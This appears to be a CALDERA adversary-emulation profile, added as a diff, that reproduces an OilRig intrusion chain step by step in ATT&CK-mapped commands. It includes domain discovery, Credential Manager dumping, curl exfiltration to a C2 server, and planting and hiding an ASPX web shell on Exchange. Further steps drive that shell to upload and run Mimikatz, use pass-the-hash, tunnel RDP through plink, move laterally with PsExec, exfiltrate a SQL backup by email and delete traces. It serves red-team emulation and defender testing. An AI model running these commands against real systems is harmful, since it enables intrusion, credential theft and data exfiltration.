@@ -1,0 +1,574 @@
+id: db88ae87-8884-42f1-aa06-d7ef9b45721d
+name: OilRig
+description: OilRig is a suspected Iranian threat group that has targeted Middle Eastern and international victims. (Emu)
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- 00000000-0000-0000-0000-000000000001
+- ed2471a9-1eeb-4787-a5d8-61f66b278a50
+- 88378065-bedf-46b9-a8b7-bc5897f4abcb
+- 0386ef16-757e-425c-8355-88e5be40eb32
+- a9861ea9-4f9a-46c9-ba60-15a02806dfdc
+- 628e8ad3-14af-4670-b797-bcf175a42842
+- 13d5ab62-c05a-4d25-bd8f-e3b27a5be611
+- e0b534a6-bff3-4964-8f7b-863ddee224b0
+- 3d450711-1062-4276-8bff-bb78ec4f4519
+- 29c018ed-eb3e-4ddb-90ec-ba3d928a00e8
+- 41ce9dd8-dc9f-4fba-8ce9-9ef5aaee3d19
+- 821fd81e-2086-4ea6-b792-fb9e044e2323
+- ae4e4c08-82cb-4a17-a873-660f851a1a38
+- cb8e9faa-ac00-48d8-a359-88044a2c0252
+- de39f574-f6cc-4026-973e-c5370b36220b
+- e6eb7d18-606e-4889-8924-f75cafa92811
+- 178bb431-4eaf-43b1-922c-f484ab54bbee
+- 09502b3c-7541-4c11-92a9-f55e683a6355
+- 7971246d-1392-411e-a803-a7946cf9e4d2
+- 6a7b4ba0-a9bb-451d-ba9f-d3a2e8a82ffe
+- f9f1bd68-ec0a-47e7-8645-210844190d92
+- a23fb84f-dfb7-4d07-a6ec-0352ae983651
+- 021245dd-c0be-4900-bd6c-1c680f00a237
+- 2f3be960-5c00-4f03-a9c2-da09c31d38d9
+- 7aaecfb7-a1eb-477c-8d53-ab3009389623
+- 5f7dc4b3-1287-4a25-b0b0-b6e73756cc11
+- 87d3322b-a435-47b5-9f97-a8db4f86dad5
+- 48927544-5a18-11ed-9b6a-0242ac120002
+- 5c279562-a004-4d9c-9ec6-a7dc4997f699
+- f96e8195-8b0f-4b87-bdce-748dfda2861f
+- f01e86f9-0b66-4191-beee-324c380690df
+- 845d36f1-13b6-4d42-a384-aa2f4af9bc27
+- 6482ba12-fa47-409c-bab8-704de6475e38
+- f3df5a83-2a5a-4277-8763-8fb51032d3fc
+- 212995b5-acfc-404b-b3a9-a19cc0afa9a5
+- dc2efbdd-3ab4-44a0-9839-385540b8a8cc
+- 5cb977ae-87c8-450f-b016-f414b42ba60f
+- d5b83af2-b79e-438d-acfc-2641282df698
+- 98279c81-d5a0-4ec4-9d40-a6e87d1f9bd2
+- 44073aa3-70e9-4a48-86b7-c25b6f29c25c
+- f1f34439-ca0d-4fe7-99af-a198a29b6a3e
+- 885c14a2-bc56-4176-8671-4cb25489ae39
+- 0c5cf9e2-3152-4b4c-9629-2ed7a00da09d
+- d9c9a941-c0e8-4eed-8cc3-6511ad5b9e15
+- 16767c68-a865-46af-a0e4-ff8d742efc3f
+abilities:
+ 00000000-0000-0000-0000-000000000001:
+  name:  Initial Access 1
+  tactic:  initial-access
+  technique_name:  "Content Injection"
+  technique_id:  T1659
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       C:\Users\Public\SystemFailureReporter.exe -server http://192.168.0.4:8888 -group gosta
+ ed2471a9-1eeb-4787-a5d8-61f66b278a50:
+  name:  OilRig Execute VBS payload to collect hostname
+  tactic:  discovery
+  technique_name:  "System Information Discovery"
+  technique_id:  T1082
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       cscript /nologo computername.vbs
+ 88378065-bedf-46b9-a8b7-bc5897f4abcb:
+  name:  OilRig Execute VBS payload to collect username
+  tactic:  discovery
+  technique_name:  "System Owner/User Discovery"
+  technique_id:  T1033
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       cscript /nologo username.vbs
+ 0386ef16-757e-425c-8355-88e5be40eb32:
+  name:  OilRig Current User
+  tactic:  discovery
+  technique_name:  "System Owner/User Discovery"
+  technique_id:  T1033
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       whoami
+ a9861ea9-4f9a-46c9-ba60-15a02806dfdc:
+  name:  OilRig Collect hostname
+  tactic:  discovery
+  technique_name:  "System Information Discovery"
+  technique_id:  T1082
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       hostname
+ 628e8ad3-14af-4670-b797-bcf175a42842:
+  name:  OilRig Network Interface Configuration
+  tactic:  discovery
+  technique_name:  "System Network Configuration Discovery"
+  technique_id:  T1016
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       ipconfig /all
+ 13d5ab62-c05a-4d25-bd8f-e3b27a5be611:
+  name:  OilRig Domain Account Discovery
+  tactic:  discovery
+  technique_name:  "Account Discovery: Domain Account"
+  technique_id:  T1087.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net user /domain
+ e0b534a6-bff3-4964-8f7b-863ddee224b0:
+  name:  OilRig Group Account Discovery
+  tactic:  discovery
+  technique_name:  "Permission Groups Discovery: Domain Groups"
+  technique_id:  T1069.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net group /domain
+ 3d450711-1062-4276-8bff-bb78ec4f4519:
+  name:  OilRig "domain admins" Group Discovery
+  tactic:  discovery
+  technique_name:  "Permission Groups Discovery: Domain Groups"
+  technique_id:  T1069.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net group "domain admins" /domain
+ 29c018ed-eb3e-4ddb-90ec-ba3d928a00e8:
+  name:  OilRig "Exchange Trusted Subsystem" Group Discovery
+  tactic:  discovery
+  technique_name:  "Permission Groups Discovery: Domain Groups"
+  technique_id:  T1069.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net group "Exchange Trusted Subsystem" /domain
+ 41ce9dd8-dc9f-4fba-8ce9-9ef5aaee3d19:
+  name:  OilRig List domain account settings
+  tactic:  discovery
+  technique_name:  "Account Discovery: Domain Account"
+  technique_id:  T1087.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net accounts /domain
+ 821fd81e-2086-4ea6-b792-fb9e044e2323:
+  name:  OilRig Local Account Discovery
+  tactic:  discovery
+  technique_name:  "Account Discovery: Local Account"
+  technique_id:  T1087.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net user
+ ae4e4c08-82cb-4a17-a873-660f851a1a38:
+  name:  OilRig "administrators" local group discovery
+  tactic:  discovery
+  technique_name:  "Permission Groups Discovery: Local Groups"
+  technique_id:  T1069.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net localgroup administrators
+ cb8e9faa-ac00-48d8-a359-88044a2c0252:
+  name:  OilRig View Network Connections
+  tactic:  discovery
+  technique_name:  "System Network Connections Discovery"
+  technique_id:  T1049
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       netstat -na
+ de39f574-f6cc-4026-973e-c5370b36220b:
+  name:  OilRig Process discovery
+  tactic:  discovery
+  technique_name:  "Process Discovery"
+  technique_id:  T1057
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       tasklist
+ e6eb7d18-606e-4889-8924-f75cafa92811:
+  name:  OilRig System Service Discovery
+  tactic:  discovery
+  technique_name:  "System Service Discovery"
+  technique_id:  T1007
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       sc query
+ 178bb431-4eaf-43b1-922c-f484ab54bbee:
+  name:  OilRig System Information Discovery
+  tactic:  discovery
+  technique_name:  "System Information Discovery"
+  technique_id:  T1082
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       systeminfo
+ 09502b3c-7541-4c11-92a9-f55e683a6355:
+  name:  OilRig Query Registry
+  tactic:  discovery
+  technique_name:  "Query Registry"
+  technique_id:  T1012
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"
+ 7971246d-1392-411e-a803-a7946cf9e4d2:
+  name:  OilRig Targeted "Gosta" Account Discovery
+  tactic:  discovery
+  technique_name:  "Account Discovery: Domain Account"
+  technique_id:  T1087.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net user #{initial.target.user} /domain
+ 6a7b4ba0-a9bb-451d-ba9f-d3a2e8a82ffe:
+  name:  OilRig "SQL Admins" Group Discovery
+  tactic:  discovery
+  technique_name:  "Permission Groups Discovery: Domain Groups"
+  technique_id:  T1069.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       net group "SQL Admins" /domain
+ f9f1bd68-ec0a-47e7-8645-210844190d92:
+  name:  OilRig nslookup WATERFALLS
+  tactic:  discovery
+  technique_name:  "Remote System Discovery"
+  technique_id:  T1018
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       nslookup #{second.target.host}
+ a23fb84f-dfb7-4d07-a6ec-0352ae983651:
+  name:  OilRig Dump Credentials from Windows Credential Manager
+  tactic:  credential-access
+  technique_name:  "Credentials from Password Stores: Windows Credential Manager"
+  technique_id:  T1555.004
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       C:\Users\#{initial.target.user}\AppData\local\SystemFailureReporter\b.exe
+ 021245dd-c0be-4900-bd6c-1c680f00a237:
+  name:  OilRig Exfil fsociety.dat
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over C2 Channel"
+  technique_id:  T1041
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       curl -F "data=@C:\Users\#{initial.target.user}\AppData\Roaming\fsociety.dat" --header "X-Request-ID: #{initial.target.user}-#{paw}" #{server}/file/upload
+ 2f3be960-5c00-4f03-a9c2-da09c31d38d9:
+  name:  OilRig Copy webshell to THEBLOCK
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       copy  C:\Users\#{initial.target.user}\AppData\Local\SystemFailureReporter\contact.aspx C:\Users\Public\contact.aspx
+ 7aaecfb7-a1eb-477c-8d53-ab3009389623:
+  name:  OilRig Copy webshell to WATERFALLS
+  tactic:  persistence
+  technique_name:  "Server Software Component: Web Shell"
+  technique_id:  T1505.003
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       copy C:\Users\Public\contact.aspx "\\#{second.target.ip}\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\"
+ 5f7dc4b3-1287-4a25-b0b0-b6e73756cc11:
+  name:  OilRig Set file hidden attribute
+  tactic:  defense-evasion
+  technique_name:  "Hide Artifacts: Hidden Files and Directories"
+  technique_id:  T1564.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       attrib +h "\\#{second.target.ip}\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\contact.aspx"
+ 87d3322b-a435-47b5-9f97-a8db4f86dad5:
+  name:  OilRig Current User (Kali Agent)
+  tactic:  discovery
+  technique_name:  "System Owner/User Discovery"
+  technique_id:  T1033
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data "pro=cmd.exe" --data "cmd=whoami" https://#{second.target.ip}/ews/contact.aspx
+ 48927544-5a18-11ed-9b6a-0242ac120002:
+  name:  OilRig Network Interface Configuration (Kali Agent)
+  tactic:  discovery
+  technique_name:  "System Network Configuration Discovery"
+  technique_id:  T1016
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data "pro=cmd.exe" --data "cmd=ipconfig /all" https://#{second.target.ip}/ews/contact.aspx
+ 5c279562-a004-4d9c-9ec6-a7dc4997f699:
+  name:  OilRig View Network Connections (Kali Agent)
+  tactic:  discovery
+  technique_name:  "System Network Connections Discovery"
+  technique_id:  T1049
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data "pro=cmd.exe" --data "cmd=netstat -an" https://#{second.target.ip}/ews/contact.aspx
+ f96e8195-8b0f-4b87-bdce-748dfda2861f:
+  name:  OilRig Download Mimikatz (Kali Agent)
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F "upl=f1" -F 'sav=C:\Windows\temp\' -F "vir=false" -F "nen=m64.exe" -F 'f1=@m64.exe' https://#{second.target.ip}/EWS/contact.aspx
+ f01e86f9-0b66-4191-beee-324c380690df:
+  name:  OilRig Execute Mimikatz (Kali Agent)
+  tactic:  credential-access
+  technique_name:  "OS Credential Dumping: LSASS Memory"
+  technique_id:  T1003.001
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data "pro=cmd.exe" --data "cmd=C:\Windows\Temp\m64.exe privilege::debug sekurlsa::logonPasswords exit 1> C:\Windows\Temp\01.txt" https://#{second.target.ip}/ews/contact.aspx
+ 845d36f1-13b6-4d42-a384-aa2f4af9bc27:
+  name:  OilRig Exfiltrate Mimikatz Output (Kali Agent)
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over C2 Channel"
+  technique_id:  T1041
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -o 01.txt --data 'don=c:\windows\temp\01.txt' https://#{second.target.ip}/EWS/contact.aspx
+ 6482ba12-fa47-409c-bab8-704de6475e38:
+  name:  OilRig Delete Mimikatz and MimiKatz Output (Kali Agent)
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: File Deletion"
+  technique_id:  T1070.004
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data "pro=cmd.exe" --data "cmd=del C:\windows\temp\01.txt C:\windows\temp\m64.exe" https://#{second.target.ip}/EWS/contact.aspx
+ f3df5a83-2a5a-4277-8763-8fb51032d3fc:
+  name:  OilRig Download Plink
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       copy  C:\Users\#{initial.target.user}\AppData\Local\SystemFailureReporter\plink.exe C:\Users\Public\Downloads\plink.exe
+ 212995b5-acfc-404b-b3a9-a19cc0afa9a5:
+  name:  OilRig Run Plink
+  tactic:  lateral-movement
+  technique_name:  "Protocol Tunneling"
+  technique_id:  T1021.001
+  executors: 
+   - proc:
+     platform: windows
+     command: |
+       exec-background C:\Users\Public\Downloads\plink.exe -no-antispoof -ssh -N -R #{caldera.server.ip}:13389:#{second.target.ip}:3389 -l #{caldera.user.name} -pw "#{caldera.user.password}" #{caldera.server.ip}
+ dc2efbdd-3ab4-44a0-9839-385540b8a8cc:
+  name:  OilRig RDP to WATERFALLS
+  tactic:  lateral-movement
+  technique_name:  "Remote Services: Remote Desktop Protocol"
+  technique_id:  T1021.001
+  executors: 
+   - proc:
+     platform: linux
+     command: |
+       exec-background xfreerdp /u:'#{network.domain.name}\#{initial.target.user}' /p:'#{initial.target.password}' /v:localhost:13389 /cert-ignore
+ 5cb977ae-87c8-450f-b016-f414b42ba60f:
+  name:  OilRig Downloads PsExec
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F "upl=f1" -F 'sav=C:\Windows\System32' -F "vir=false" -F "nen=ps.exe" -F 'f1=@PsExec.exe' https://#{second.target.host}/ews/contact.aspx
+ d5b83af2-b79e-438d-acfc-2641282df698:
+  name:  OilRig Downloads RDAT
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F "upl=f1" -F 'sav=C:\Windows\Temp' -F "vir=false" -F "nen=Nt.dat" -F 'f1=@RDAT.exe' https://#{second.target.host}/ews/contact.aspx
+ 98279c81-d5a0-4ec4-9d40-a6e87d1f9bd2:
+  name:  OilRig Downloads mom64.exe
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST -F "upl=f1" -F 'sav=C:\Windows\System32' -F "vir=false" -F "nen=mom64.exe" -F 'f1=@m64.exe' https://#{second.target.host}/ews/contact.aspx
+ 44073aa3-70e9-4a48-86b7-c25b6f29c25c:
+  name:  OilRig PSEXEC is used to execute commands on ENDOFROAD
+  tactic:  execution
+  technique_name:  "System Services: Service Execution"
+  technique_id:  T1569.002
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       sleep 5;
+       rdp_pid=$(pgrep -f "xfreerdp.*/v:localhost");
+       rdp_window=$(xdotool search --pid "$rdp_pid");
+       xdotool key --window "$rdp_window" Super_L;
+       sleep 5; 
+       xdotool windowactivate --sync "$rdp_window" type --delay 200 "cmd";
+       sleep 3; 
+       xdotool key --window "$rdp_window" Ctrl+Shift+Return;
+       sleep 3; 
+       xdotool key --window "$rdp_window" Tab Tab;
+       xdotool key --window "$rdp_window" Rexturn;
+       sleep 3; 
+       xdotool type --window "$rdp_window" 'C:\Windows\System32\mom64.exe "privilege::debug" "sekurlsa::pth /user:#{second.target.user} /domain:#{network.domain.name} /ntlm:#{second.target.ntlm}"';
+       xdotool key --window "$rdp_window" Return;
+       sleep 3; 
+       xdotool type --window "$rdp_window" 'copy C:\Windows\Temp\Nt.dat \\#{third.target.ip}\C$\ProgramData\';
+       xdotool key --window "$rdp_window" Return;
+       sleep 3; 
+       xdotool type --window "$rdp_window" 'C:\Windows\System32\ps.exe \\#{third.target.ip} cmd.exe';
+       xdotool key --window "$rdp_window" Return;
+       sleep 5;
+ f1f34439-ca0d-4fe7-99af-a198a29b6a3e:
+  name:  OilRig File and Directory Discovery on ENDOFROAD
+  tactic:  discovery
+  technique_name:  "File and Directory Discovery"
+  technique_id:  T1083
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       sleep 3;
+       rdp_pid=$(pgrep -f "xfreerdp.*/v:localhost");
+       rdp_window=$(xdotool search --pid "$rdp_pid");
+       sleep 3; 
+       xdotool type --window "$rdp_window" 'dir "C:\Program Files\Microsoft SQL Server\"';
+       xdotool key --window "$rdp_window" Return;
+       sleep 3; 
+       xdotool type --window "$rdp_window" 'dir "C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\Backup\"';
+       xdotool key --window "$rdp_window" Return;
+       sleep 4;
+ 885c14a2-bc56-4176-8671-4cb25489ae39:
+  name:  OilRig Exfiltrate Data via EWS API to attacker-controlled email
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol"
+  technique_id:  T1048.003
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       sleep 2;
+       rdp_pid=$(pgrep -f "xfreerdp.*/v:localhost");
+       rdp_window=$(xdotool search --pid "$rdp_pid");
+       sleep 3; 
+       xdotool type --window "$rdp_window" 'mkdir C:\Programdata\VMware';
+       xdotool key --window "$rdp_window" Return;
+       sleep 3; 
+       xdotool type --window "$rdp_window" 'move C:\ProgramData\Nt.dat C:\ProgramData\VMware\VMware.exe';
+       xdotool key --window "$rdp_window" Return;
+       sleep 3;
+       xdotool type --window "$rdp_window" 'cd "C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\Backup\"';
+       xdotool key --window "$rdp_window" Return;
+       sleep 3;
+       xdotool type --window "$rdp_window" 'C:\ProgramData\VMware\VMware.exe --path="sitedata.bak" --to="#{exfil.target.email}" --from="#{initial.target.user}@#{network.domain.name}" --server="#{second.target.ip}" --password='#{initial.target.password}' --chunksize="200000"';
+       sleep 1; 
+       xdotool key --window "$rdp_window" Return;
+       sleep 15;
+ 0c5cf9e2-3152-4b4c-9629-2ed7a00da09d:
+  name:  OilRig Cleanup via RDP
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: File Deletion"
+  technique_id:  T1070.004
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       sleep 3;
+       rdp_pid=$(pgrep -f "xfreerdp.*/v:localhost");
+       rdp_window=$(xdotool search --pid "$rdp_pid");
+       sleep 3; 
+       xdotool type --window "$rdp_window" 'del C:\ProgramData\VMware\VMware.exe';
+       sleep 3; 
+       xdotool key --window "$rdp_window" Return;
+       sleep 3; 
+       xdotool type --window "$rdp_window" 'rmdir C:\ProgramData\VMware';
+       sleep 3; 
+       xdotool key --window "$rdp_window" Return;
+       sleep 1;
+       xdotool type --window "$rdp_window" 'exit';
+       xdotool key --window "$rdp_window" Return;
+       sleep 1;
+       xdotool type --window "$rdp_window" 'exit';
+       xdotool key --window "$rdp_window" Return;
+       sleep 3;
+       xdotool type --window "$rdp_window" 'exit';
+       xdotool key --window "$rdp_window" Return;
+       sleep 2;
+       xdotool type --window "$rdp_window" 'del C:\Windows\System32\mom64.exe C:\Windows\Temp\Nt.dat C:\Windows\System32\ps.exe';
+       xdotool key --window "$rdp_window" Return;
+       sleep 2;   
+       xdotool type --window "$rdp_window" 'exit';
+       xdotool key --window "$rdp_window" Return;
+       sleep 2;
+       
+       kill $(ps aux | grep "sshd: #{caldera.user.name}" | grep -v priv | grep -v grep | awk '{print $2}')
+ d9c9a941-c0e8-4eed-8cc3-6511ad5b9e15:
+  name:  OilRig Cleanup on Gosta
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: File Deletion"
+  technique_id:  T1070.004
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       del C:\Users\gosta\AppData\Roaming\fsociety.dat C:\Users\Public\Downloads\plink.exe;
+ 16767c68-a865-46af-a0e4-ff8d742efc3f:
+  name:  OilRig Kill Gosta Agent
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: File Deletion"
+  technique_id:  T1070.004
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       curl -s -H "KEY:#{server.api.key}" -H "Content-Type: application/json" -X PATCH http://#{caldera.server.ip}:8888/api/v2/agents/#{paw} -d "{\"watchdog\":1}"
